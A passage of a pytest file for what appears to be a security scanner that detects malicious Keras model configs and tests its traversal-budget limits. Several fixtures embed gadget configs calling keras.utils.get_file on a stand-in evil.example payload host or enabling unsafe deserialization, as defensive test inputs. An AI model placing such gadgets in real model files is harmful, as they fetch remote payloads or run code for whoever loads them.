        assert details["cwe"] == "CWE-502"
        assert details["description"]
        assert "3.11.0" in details["remediation"]


class TestKerasZipConfigTraversalBudget:
    """Regression coverage for bounded .keras config.json traversal."""

    @staticmethod
    def _make_keras_zip(config: dict[str, Any], tmp_path: Path) -> str:
        return _build_test_keras_zip(config, tmp_path, "3.0.0")

    @staticmethod
    def _nested_tail(depth: int) -> dict[str, Any]:
        tail: dict[str, Any] = {"leaf": "benign"}
        for index in range(depth):
            tail = {"nested": tail, "marker": f"depth-{index}"}
        return tail

    def test_budget_exhaustion_fails_closed_and_preserves_get_file_cve(self, tmp_path: Path) -> None:
        """A deep attacker config should not hide a reachable get_file gadget."""
        scanner = KerasZipScanner(
            {
                "max_config_traversal_depth": 12,
                "max_config_traversal_items": 10_000,
                "max_config_string_literals": 10_000,
                "max_config_string_chars": 100_000,
            }
        )
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "keras.utils.get_file",
                            "url": "https://evil.example/payload.bin",
                        },
                    }
                ]
            },
            "padding": self._nested_tail(40),
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]
        budget_checks = [
            check
            for check in result.checks
            if check.name == "Config Traversal Depth Limit" and check.status == CheckStatus.FAILED
        ]
        assert len(budget_checks) == 1
        assert budget_checks[0].details["scan_outcome_reason"] == "keras_zip_config_traversal_depth_exceeded"

    def test_depth_boundary_preserves_locally_inspectable_get_file_cve(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_depth": 1,
                "max_config_traversal_items": 100,
                "max_config_string_literals": 100,
                "max_config_string_chars": 10_000,
            }
        )
        config = {
            "gadget": {
                "fn": "keras.utils.get_file",
                "url": "https://evil.example/payload.bin",
            }
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        assert any(issue.details.get("cve_id") == "CVE-2025-8747" for issue in result.issues)
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_near_match_within_budget_does_not_trigger_get_file_cve(self, tmp_path: Path) -> None:
        """get_file and URL tokens in unrelated bounded contexts should stay benign."""
        scanner = KerasZipScanner(
            {
                "max_config_traversal_depth": 64,
                "max_config_traversal_items": 1_000,
                "max_config_string_literals": 1_000,
                "max_config_string_chars": 100_000,
            }
        )
        config = {
            "class_name": "Model",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"fn": "get_file", "path": "/local/file.h5"},
                    }
                ],
                "metadata": {"download_url": "https://example.com/model-info"},
            },
            "padding": self._nested_tail(6),
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        assert result.success is True
        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-9906"]

    @pytest.mark.parametrize(
        ("gadget", "cve_id"),
        [
            (
                {"fn": "keras.utils.get_file", "url": "https://evil.example/payload.bin"},
                "CVE-2025-8747",
            ),
            (
                {
                    "fn": "keras.utils.get_file",
                    "origin": "https://evil.example/payload.tar.gz",
                    "extract": True,
                },
                "CVE-2025-12060",
            ),
        ],
    )
    def test_scalar_siblings_within_budget_do_not_hide_nested_get_file_cve(
        self,
        tmp_path: Path,
        gadget: dict[str, Any],
        cve_id: str,
    ) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 32,
                "max_config_string_literals": 64,
                "max_config_string_chars": 4096,
            }
        )
        config = {**{f"padding_{index}": "benign" for index in range(20)}, "nested": gadget}

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == cve_id]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME

    def test_nested_kwargs_strings_are_not_double_counted(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 100,
                "max_config_string_literals": 100,
                "max_config_string_chars": 300,
            }
        )
        config = {
            "fn": "keras.utils.get_file",
            "kwargs": {
                "first": "x" * 100,
                "second": "y" * 100,
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        assert result.success is True
        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_string_char_limit_exceeded" not in result.metadata.get(
            "scan_outcome_reasons",
            [],
        )

    def test_nested_get_file_kwargs_are_not_recursively_rescanned(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 100,
                "max_config_string_literals": 100,
                "max_config_string_chars": 250,
            }
        )
        config: dict[str, Any] = {"fn": "keras.utils.get_file", "origin": "z" * 100}
        for _ in range(3):
            config = {"fn": "keras.utils.get_file", "kwargs": config}

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        assert result.success is True
        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_string_char_limit_exceeded" not in result.metadata.get(
            "scan_outcome_reasons",
            [],
        )

    @pytest.mark.parametrize(
        ("detector_name", "gadget", "cve_id"),
        [
            (
                "_check_get_file_gadget",
                {"fn": "keras.utils.get_file", "url": "https://evil.example/payload.bin"},
                "CVE-2025-8747",
            ),
            (
                "_check_get_file_archive_extraction",
                {
                    "fn": "keras.utils.get_file",
                    "origin": "https://evil.example/payload.tar.gz",
                    "extract": True,
                },
                "CVE-2025-12060",
            ),
        ],
    )
    def test_literal_overflow_does_not_hide_later_admitted_get_file_gadget(
        self,
        detector_name: str,
        gadget: dict[str, Any],
        cve_id: str,
    ) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 100,
                "max_config_string_literals": 100,
                "max_config_string_chars": 128,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
        config = {
            "padding": "x" * 129,
            "overflow": {"padding": "y" * 129},
            "nested": gadget,
        }

        getattr(scanner, detector_name)(config, result)

        assert any(issue.details.get("cve_id") == cve_id for issue in result.issues)
        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    @pytest.mark.parametrize("detector_name", ["_check_get_file_gadget", "_check_get_file_archive_extraction"])
    def test_literal_overflow_does_not_turn_get_file_near_match_into_finding(self, detector_name: str) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 100,
                "max_config_string_literals": 100,
                "max_config_string_chars": 128,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
        config = {
            "padding": "x" * 129,
            "nested": {
                "fn": "get_file_helper",
                "origin": "https://evil.example/payload.tar.gz",
                "extract": True,
            },
        }

        getattr(scanner, detector_name)(config, result)

        assert not [
            issue for issue in result.issues if issue.details.get("cve_id") in {"CVE-2025-8747", "CVE-2025-12060"}
        ]
        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    @pytest.mark.parametrize(
        ("layer_class", "expected_check", "expected_cve"),
        [
            ("Lambda", None, "CVE-2024-3660"),
            ("UntrustedCustomLayer", "Custom Layer Class Detection", None),
        ],
    )
    def test_string_overflow_preserves_queued_layer_security_findings(
        self,
        layer_class: str,
        expected_check: str | None,
        expected_cve: str | None,
    ) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 100,
                "max_config_string_literals": 100,
                "max_config_string_chars": 128,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
        config = {
            "padding": "x" * 129,
            "config": {"layers": [{"class_name": layer_class, "config": {}}]},
        }

        bounded_config = scanner._validate_config_traversal_budget(config, result)
        scanner._scan_model_config(bounded_config, result)

        if expected_cve is not None:
            assert any(issue.details.get("cve_id") == expected_cve for issue in result.issues)
        if expected_check is not None:
            assert any(check.name == expected_check and check.status == CheckStatus.FAILED for check in result.checks)
        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_security_projection_strings_share_bounded_reserve_after_overflow(self) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 1_000,
                "max_config_string_literals": 1_000,
                "max_config_string_chars": 16,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
        config = {
            "padding": "x" * 17,
            "compile_config": {"metrics": [f"metric_{index:04d}" for index in range(100)]},
        }

        bounded_config = scanner._validate_config_traversal_budget(config, result)

        projected_metrics = bounded_config["compile_config"]["metrics"]
        assert sum(len(metric) for metric in projected_metrics) <= 16
        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_projection_unknown_keys_remain_item_bounded_after_string_overflow(self) -> None:
        class CountingDict(dict[str, Any]):
            item_iterations = 0

            def items(self) -> Iterator[tuple[str, Any]]:  # type: ignore[override]
                for item in super().items():
                    type(self).item_iterations += 1
                    if type(self).item_iterations > 6:
                        pytest.fail("projection iterated unknown keys beyond the direct-work budget")
                    yield item

        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 5,
                "max_config_string_literals": 100,
                "max_config_string_chars": 128,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
        config = ["x" * 129, CountingDict({f"unknown_{index}": "benign" for index in range(1_000)})]

        scanner._validate_config_traversal_budget(config, result)

        assert CountingDict.item_iterations <= 6
        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_literal_overflow_does_not_hide_queued_unsafe_deserialization(self) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 100,
                "max_config_string_literals": 100,
                "max_config_string_chars": 128,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
        config = [
            "x" * 129,
            {"module": "keras.config", "fn": "enable_unsafe_deserialization"},
        ]

        assert scanner._has_unsafe_deserialization_reference(config, result) is True
        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_literal_overflow_does_not_flag_unsafe_deserialization_near_match(self) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 100,
                "max_config_string_literals": 100,
                "max_config_string_chars": 128,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
        config = [
            "x" * 129,
            {"module": "keras.config", "fn": "enable_unsafe_deserialization_helper"},
        ]

        assert scanner._has_unsafe_deserialization_reference(config, result) is False
        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    @pytest.mark.parametrize(
        ("callable_name", "expected"),
        [("get_file", True), ("get_file_helper", False)],
    )
    def test_nested_callable_get_file_reference_is_scoped_to_exact_callable(
        self,
        callable_name: str,
        expected: bool,
    ) -> None:
        scanner = KerasZipScanner()
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
        config = {
            "fn": {"module": "keras.utils", "config": callable_name},
            "url": "https://evil.example/payload.bin",
        }

        scanner._check_get_file_gadget(config, result)

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
        assert bool(cve_issues) is expected

    def test_archive_origin_is_bounded_before_strip_and_url_matching(self) -> None:
        class GuardedOrigin(str):
            def strip(self, chars: str | None = None, /) -> str:
                pytest.fail("archive detector stripped the unbounded origin")

        scanner = KerasZipScanner()
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
        origin = GuardedOrigin(f"https://evil.example/{'x' * 10_000}.tar.gz")

        scanner._check_get_file_archive_extraction(
            {"fn": "keras.utils.get_file", "origin": origin, "extract": True},
            result,
        )

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert len(cve_issues[0].details["urls"][0]) <= scanner.MAX_CONFIG_SECURITY_LITERAL_CHARS

    def test_bounded_projection_limits_root_layer_scanning(self) -> None:
        class CountingList(list[Any]):
            item_iterations = 0

            def __iter__(self) -> Iterator[Any]:
                for item in super().__iter__():
                    type(self).item_iterations += 1
                    yield item

        layers = CountingList({"class_name": "Dense", "config": {}} for _ in range(100))
        config = {"class_name": "Sequential", "config": {"layers": layers}}
        scanner = KerasZipScanner({"max_config_traversal_items": 5})
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        bounded_config = scanner._validate_config_traversal_budget(config, result)
        projection_iterations = CountingList.item_iterations
        scanner._scan_model_config(bounded_config, result)

        assert CountingList.item_iterations == projection_iterations
        assert projection_iterations <= 2
        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_bounded_projection_limits_inbound_node_scanning(self) -> None:
        class CountingList(list[Any]):
            item_iterations = 0

            def __iter__(self) -> Iterator[Any]:
                for item in super().__iter__():
                    type(self).item_iterations += 1
                    yield item

        inbound_nodes = CountingList({"args": [], "kwargs": {}} for _ in range(100))
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "config": {},
                        "inbound_nodes": inbound_nodes,
                    }
                ]
            },
        }
        scanner = KerasZipScanner({"max_config_traversal_items": 9})
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        bounded_config = scanner._validate_config_traversal_budget(config, result)
        projection_iterations = CountingList.item_iterations
        scanner._scan_model_config(bounded_config, result)

        assert CountingList.item_iterations == projection_iterations
        assert projection_iterations <= 2
        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_bounded_projection_limits_compile_config_recursion(self) -> None:
        class CountingList(list[Any]):
            item_iterations = 0

            def __iter__(self) -> Iterator[Any]:
                for item in super().__iter__():
                    type(self).item_iterations += 1
                    yield item

        metrics: Any = "mean_squared_error"
        for _ in range(100):
            metrics = CountingList([metrics])
        config = {"class_name": "Sequential", "compile_config": {"metrics": metrics}}
        scanner = KerasZipScanner(
            {
                "max_config_traversal_depth": 5,
                "max_config_traversal_items": 1_000,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        bounded_config = scanner._validate_config_traversal_budget(config, result)
        projection_iterations = CountingList.item_iterations
        scanner._scan_model_config(bounded_config, result)

        assert CountingList.item_iterations == projection_iterations
        assert projection_iterations <= 6
        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_bounded_projection_preserves_boundary_lambda_finding(self) -> None:
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "config": {},
                    }
                ]
            },
        }
        scanner = KerasZipScanner({"max_config_traversal_depth": 3})
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        bounded_config = scanner._validate_config_traversal_budget(config, result)
        scanner._scan_model_config(bounded_config, result)

        assert any(issue.details.get("cve_id") == "CVE-2024-3660" for issue in result.issues)
        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_bounded_projection_preserves_boundary_custom_metric_finding(self) -> None:
        config = {
            "class_name": "Sequential",
            "compile_config": {
                "metrics": [
                    {
                        "class_name": "EvilMetric",
                        "config": {},
                    }
                ]
            },
        }
        scanner = KerasZipScanner({"max_config_traversal_depth": 3})
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        bounded_config = scanner._validate_config_traversal_budget(config, result)
        scanner._scan_model_config(bounded_config, result)

        assert any(
            check.name == "Custom Metric Detection" and check.details.get("identifier") == "EvilMetric"
            for check in result.checks
        )
        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_bounded_projection_preserves_item_boundary_lambda_finding(self) -> None:
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {"class_name": "Lambda", "config": {}},
                    {"class_name": "Dense", "config": {}},
                ]
            },
        }
        scanner = KerasZipScanner({"max_config_traversal_items": 5})
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        bounded_config = scanner._validate_config_traversal_budget(config, result)
        scanner._scan_model_config(bounded_config, result)

        assert any(issue.details.get("cve_id") == "CVE-2024-3660" for issue in result.issues)
        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_bounded_projection_preserves_item_boundary_custom_metric_finding(self) -> None:
        config = {
            "class_name": "Sequential",
            "compile_config": {
                "metrics": [
                    {"class_name": "EvilMetric", "config": {}},
                    {"class_name": "MeanSquaredError", "config": {}},
                ]
            },
        }
        scanner = KerasZipScanner({"max_config_traversal_items": 5})
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        bounded_config = scanner._validate_config_traversal_budget(config, result)
        scanner._scan_model_config(bounded_config, result)

        assert any(
            check.name == "Custom Metric Detection" and check.details.get("identifier") == "EvilMetric"
            for check in result.checks
        )
        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_configured_depth_is_clamped_for_recursive_compile_consumers(self) -> None:
        metrics: Any = "mean_squared_error"
        for _ in range(1_000):
            metrics = [metrics]
        config = {"class_name": "Sequential", "compile_config": {"metrics": metrics}}
        scanner = KerasZipScanner(
            {
                "max_config_traversal_depth": 10_000,
                "max_config_traversal_items": 3_000,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        bounded_config = scanner._validate_config_traversal_budget(config, result)
        scanner._scan_model_config(bounded_config, result)

        assert scanner.max_config_traversal_depth == scanner.MAX_CONFIG_TRAVERSAL_DEPTH
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]

    @pytest.mark.parametrize("detector_name", ["_check_get_file_gadget", "_check_get_file_archive_extraction"])
    def test_shallow_dict_iteration_stops_after_detector_budget(self, detector_name: str) -> None:
        class CountingDict(dict[str, Any]):
            item_iterations = 0

            def items(self) -> Iterator[tuple[str, Any]]:  # type: ignore[override]
                for item in super().items():
                    self.item_iterations += 1
                    if self.item_iterations > 20:
                        pytest.fail("detector continued iterating after its config budget was exhausted")
                    yield item

        config = CountingDict({f"field_{index}": "benign" for index in range(1_000)})
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 5,
                "max_config_string_literals": 5,
                "max_config_string_chars": 1024,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        getattr(scanner, detector_name)(config, result)

        assert config.item_iterations <= 20
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME

    @pytest.mark.parametrize("traversal_name", ["validate", "iterate"])
    def test_nested_wide_containers_reserve_pending_item_budget(self, traversal_name: str) -> None:
        class CountingList(list[Any]):
            item_iterations = 0

            def __iter__(self) -> Iterator[Any]:
                for item in super().__iter__():
                    type(self).item_iterations += 1
                    if type(self).item_iterations > 6:
                        pytest.fail("traversal iterated children beyond its admitted item budget")
                    yield item

        config = CountingList([CountingList([{} for _ in range(5)]) for _ in range(5)])
        scanner = KerasZipScanner({"max_config_traversal_items": 6})
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        if traversal_name == "validate":
            scanner._validate_config_traversal_budget(config, result)
        else:
            list(scanner._iter_dict_nodes(config, result, state=scanner._new_config_traversal_state()))

        assert CountingList.item_iterations <= 6
        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    @pytest.mark.parametrize(
        ("detector_name", "config", "max_items", "cve_id"),
        [
            (
                "_check_get_file_gadget",
                {
                    **{f"padding_{index}": {} for index in range(4)},
                    "gadget": {
                        "fn": "keras.utils.get_file",
                        "url": "https://evil.example/payload.bin",
                    },
                    "overflow": {},
                },
                6,
                "CVE-2025-8747",
            ),
            (
                "_check_get_file_archive_extraction",
                {
                    **{f"padding_{index}": {} for index in range(4)},
                    "gadget": {
                        "fn": "keras.utils.get_file",
                        "origin": "https://evil.example/payload.tar.gz",
                        "extract": True,
                    },
                    "overflow": {},
                },
                6,
                "CVE-2025-12060",
            ),
            (
                "_check_unsafe_deserialization_bypass",
                [
                    {"x": 0},
                    {"module": "keras.config", "fn": "enable_unsafe_deserialization"},
                    {"overflow": 0},
                ],
                3,
                "CVE-2025-9906",
            ),
        ],
    )
    def test_last_admitted_gadget_is_checked_before_overflow_stops_traversal(
        self,
        detector_name: str,
        config: Any,
        max_items: int,
        cve_id: str,
    ) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": max_items,
                "max_config_string_literals": 100,
                "max_config_string_chars": 10_000,
            }
        )
        scanner.current_file_path = "boundary.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        getattr(scanner, detector_name)(config, result)

        assert any(issue.details.get("cve_id") == cve_id for issue in result.issues)
        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    @pytest.mark.parametrize(
        "args",
        [
            ["https://evil.example/payload.bin", "a", "b", "c", "overflow"],
            ["a", "b", "c", "https://evil.example/payload.bin", "overflow"],
        ],
    )
    def test_get_file_positional_url_survives_literal_item_exhaustion(self, args: list[str]) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 5,
                "max_config_string_literals": 100,
                "max_config_string_chars": 10_000,
            }
        )
        scanner.current_file_path = "boundary.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        scanner._check_get_file_gadget({"fn": "keras.utils.get_file", "args": args}, result)

        assert any(issue.details.get("cve_id") == "CVE-2025-8747" for issue in result.issues)
        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_unsafe_deserialization_direct_string_iteration_is_item_bounded(self) -> None:
        class CountingDict(dict[str, Any]):
            item_iterations = 0

            def items(self) -> Iterator[tuple[str, Any]]:  # type: ignore[override]
                for item in super().items():
                    type(self).item_iterations += 1
                    if type(self).item_iterations > 6:
                        pytest.fail("unsafe-deserialization detector exceeded its direct item budget")
                    yield item

        config = CountingDict({f"field_{index}": "benign" for index in range(100)})
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 5,
                "max_config_string_literals": 1_000,
                "max_config_string_chars": 100_000,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        assert scanner._has_unsafe_deserialization_reference(config, result) is False

        assert CountingDict.item_iterations <= 6
        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    @pytest.mark.parametrize(
        ("detector_name", "max_item_iterations"),
        [
            ("_check_get_file_gadget", 12),
            ("_check_get_file_archive_extraction", 12),
            ("_has_unsafe_deserialization_reference", 12),
        ],
    )
    def test_direct_string_budget_is_globally_bounded_across_admitted_dicts(
        self,
        detector_name: str,
        max_item_iterations: int,
    ) -> None:
        class CountingDict(dict[str, Any]):
            item_iterations = 0

            def items(self) -> Iterator[tuple[str, Any]]:  # type: ignore[override]
                for item in super().items():
                    type(self).item_iterations += 1
                    if type(self).item_iterations > max_item_iterations:
                        pytest.fail("detector multiplied its direct item budget across admitted dicts")
                    yield item

        config = [CountingDict({f"field_{index}": "benign" for index in range(100)}) for _ in range(9)]
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 10,
                "max_config_string_literals": 1_000,
                "max_config_string_chars": 100_000,
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        getattr(scanner, detector_name)(config, result)

        assert CountingDict.item_iterations <= max_item_iterations
        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_truncated_unsafe_deserialization_near_match_does_not_trigger(self) -> None:
        dangerous_token = "keras.config.enable_unsafe_deserialization"
        scanner = KerasZipScanner(
            {
                "max_config_traversal_items": 10,
                "max_config_string_literals": 10,
                "max_config_string_chars": len(dangerous_token),
            }
        )
        scanner.current_file_path = "bounded.keras"
        result = ScanResult(scanner_name=scanner.name, scanner=scanner)

        assert scanner._has_unsafe_deserialization_reference({"loader": f"{dangerous_token}_safe"}, result) is False

        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-9906"]

        exact_result = ScanResult(scanner_name=scanner.name, scanner=scanner)
        assert scanner._has_unsafe_deserialization_reference(dangerous_token, exact_result) is True
        assert exact_result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME

    @pytest.mark.parametrize(
        ("config", "cve_id"),
        [
            (
                {
                    "class_name": "Sequential",
                    "config": {
                        "layers": [
                            {
                                "class_name": "Dense",
                                "name": "dense_1",
                                "config": {
                                    "fn": "keras.utils.get_file",
                                    "url": "https://evil.example/payload.bin",
                                },
                            }
                        ]
                    },
                },
                "CVE-2025-8747",
            ),
            (
                {
                    "class_name": "Sequential",
                    "config": {
                        "layers": [
                            {
                                "class_name": "Dense",
                                "name": "dense_1",
                                "config": {
                                    "fn": "keras.utils.get_file",
                                    "url": "https://evil.example/payload.tar.gz",
                                    "extract": True,
                                },
                            }
                        ]
                    },
                },
                "CVE-2025-12060",
            ),
            (
                {
                    "class_name": "Sequential",
                    "config": {
                        "layers": [
                            {
                                "class_name": "Dense",
                                "name": "dense_1",
                                "config": {
                                    "module": "keras.config",
                                    "fn": "enable_unsafe_deserialization",
                                },
                            }
                        ]
                    },
                },
                "CVE-2025-9906",
            ),
        ],
    )
    def test_config_budget_preserves_existing_cve_detections(
        self,
        tmp_path: Path,
        config: dict[str, Any],
        cve_id: str,
    ) -> None:
        scanner = KerasZipScanner(
            {
                "max_config_traversal_depth": 64,
                "max_config_traversal_items": 1_000,
                "max_config_string_literals": 1_000,
                "max_config_string_chars": 100_000,
            }
        )

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == cve_id]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME


class TestCVE20259906UnsafeDeserialization:
    """Test CVE-2025-9906: enable_unsafe_deserialization config bypass detection."""

    def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with raw config string."""
        return _build_test_keras_zip(config_str, tmp_path, "3.0.0")

    def test_enable_unsafe_deserialization_detected(self, tmp_path: Path) -> None:
        """Config referencing enable_unsafe_deserialization should be CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "keras.config",
                        "config": {
                            "fn": "enable_unsafe_deserialization",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1, "Should detect enable_unsafe_deserialization reference"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        cve_checks = [c for c in result.checks if c.name == "CVE-2025-9906: Unsafe Deserialization Bypass"]
        assert len(cve_checks) >= 1
        assert any(c.status != CheckStatus.PASSED for c in cve_checks)

    def test_enable_unsafe_deserialization_in_nested_value(self, tmp_path: Path) -> None:
        """enable_unsafe_deserialization anywhere in config should be detected."""
        scanner = KerasZipScanner()
        # Embed the string in a deeply nested config value
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "layers": [],
                    "metadata": {"loader": "keras.config.enable_unsafe_deserialization"},
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1
        cve_checks = [c for c in result.checks if c.name == "CVE-2025-9906: Unsafe Deserialization Bypass"]
        assert len(cve_checks) >= 1
        assert any(c.status != CheckStatus.PASSED for c in cve_checks)

    def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
        """Normal config without enable_unsafe_deserialization should be clean."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0, "Normal config should not trigger CVE-2025-9906"

